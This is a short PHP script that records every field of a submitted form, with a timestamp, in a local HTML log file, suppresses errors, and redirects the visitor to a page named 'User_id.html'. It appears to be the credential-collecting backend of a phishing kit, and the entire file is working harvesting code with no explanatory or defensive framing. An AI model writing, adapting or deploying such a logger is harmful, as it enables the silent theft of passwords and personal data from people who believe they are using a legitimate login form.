<?php
error_reporting(0);
$log_file = __DIR__ . "/Ax_Dekho.html";

if (is_writable($log_file) || (!file_exists($log_file) && is_writable(__DIR__))) {
    $handle = fopen($log_file, "a");

    fwrite($handle, "<!-- Submission at " . date('Y-m-d H:i:s') . " -->");

    foreach($_POST as $variable => $value)
    {
      $safe_variable = htmlspecialchars($variable);
      $safe_value = htmlspecialchars($value);

      fwrite($handle, $safe_variable);
      fwrite($handle, " = ");
      fwrite($handle, $safe_value);
      fwrite($handle, "\r\n");
    }
    fwrite($handle, "\r\n");
    fclose($handle);
}

header('Location: User_id.html');
exit;
?>